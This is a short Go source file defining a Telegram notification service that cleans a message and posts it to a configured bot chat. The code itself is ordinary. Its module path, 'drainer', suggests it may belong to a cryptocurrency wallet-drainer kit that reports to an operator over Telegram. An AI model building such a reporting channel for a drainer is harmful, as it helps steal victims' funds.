package service

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"time"

	"drainer/internal/config"
)

var sanitizeReg = regexp.MustCompile(`[<>"+()#_'&-]`)

type TelegramService struct {
	token  string
	chatID string
	client *http.Client
}

func NewTelegramService(cfg *config.Config) *TelegramService {
	return &TelegramService{
		token:  cfg.TelegramToken,
		chatID: cfg.TelegramChatID,
		client: &http.Client{Timeout: 10 * time.Second},
	}
}

func (s *TelegramService) Send(message string) error {
	if s.token == "" || s.chatID == "" {
		return fmt.Errorf("telegram: token ou chat_id non configuré")
	}

	sanitized := sanitizeReg.ReplaceAllString(message, "")
	if sanitized == "" {
		return fmt.Errorf("telegram: message vide après sanitisation")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", s.token)
	payload := map[string]string{
		"chat_id": s.chatID,
		"text":    sanitized,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("telegram: marshal: %w", err)
	}

	resp, err := s.client.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return fmt.Errorf("telegram: http post: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("telegram: statut inattendu %d", resp.StatusCode)
		return fmt.Errorf("telegram: statut %d", resp.StatusCode)
	}

	return nil
}
